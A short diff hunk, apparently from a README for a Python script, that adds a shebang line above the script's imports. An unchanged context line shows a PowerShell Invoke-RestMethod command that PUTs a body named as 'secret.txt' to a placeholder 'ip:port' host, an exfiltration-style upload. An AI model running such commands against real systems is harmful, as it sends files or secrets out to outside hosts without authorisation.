@@ -34,6 +34,7 @@ Invoke-RestMethod -Uri http://ip:port/secret.txt -Method PUT -Body $body
 Script
 ------------------------
 ```python
+#!/usr/bin/env python
 import sys
 import signal
 from threading import Thread
